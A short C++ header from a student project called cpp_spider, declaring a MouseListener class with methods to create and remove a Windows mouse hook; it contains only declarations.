/*
** MouseListener.hpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/MouseListener.hpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:14:56 2017 Gauthier Cler
** Last update Sun Oct 08 22:14:57 2017 Gauthier Cler
*/

#ifndef CPP_SPIDER_MOUSELISTENER_HPP
#define CPP_SPIDER_MOUSELISTENER_HPP

#include "IListener.hpp"

namespace Client {

	class MouseListener : public IListener {

	public:

		MouseListener();

		~MouseListener();

		virtual void createHook(HINSTANCE const &moduleHandle);

		virtual void removeHook();

	};
}


#endif //CPP_SPIDER_MOUSELISTENER_HPP